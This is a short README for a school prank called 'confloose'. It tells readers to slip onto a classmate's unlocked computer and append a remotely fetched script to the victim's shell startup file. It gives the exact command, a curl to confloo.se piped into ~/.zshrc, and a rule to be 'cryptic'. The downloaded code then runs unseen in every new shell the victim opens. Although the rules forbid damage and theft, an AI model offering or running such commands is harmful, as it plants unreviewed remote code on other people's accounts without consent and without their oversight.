Confloose
=========

A *confloose* (or "loose configuration") is a collection of the worst a startup
script can do for you.

There has been a prank going on from quite some time in my IT school --
when someone leaves his computer unattended, and without locking it, one would
append a script to the victim's shell startup file.

The deal is to put really annoying things right off the bat while not harming
the computer and the data on it -- this prank is meant as a lesson (you should
not leave your computer unattended in public space), and a fun challenge (at
least for the one watching from afar)

How to confloose somebody :
---------------------------

``curl "http://confloo.se/hard" >> ~/.the_shell_rc``

So, as an example, confloosing someone using zsh :

``curl "http://confloo.se/hard" >> ~/.zshrc``

Rules :
-------
1. Don't destroy anything.
2. Don't steal anything.
3. Try to be cryptic.
4. Be fun and creative.
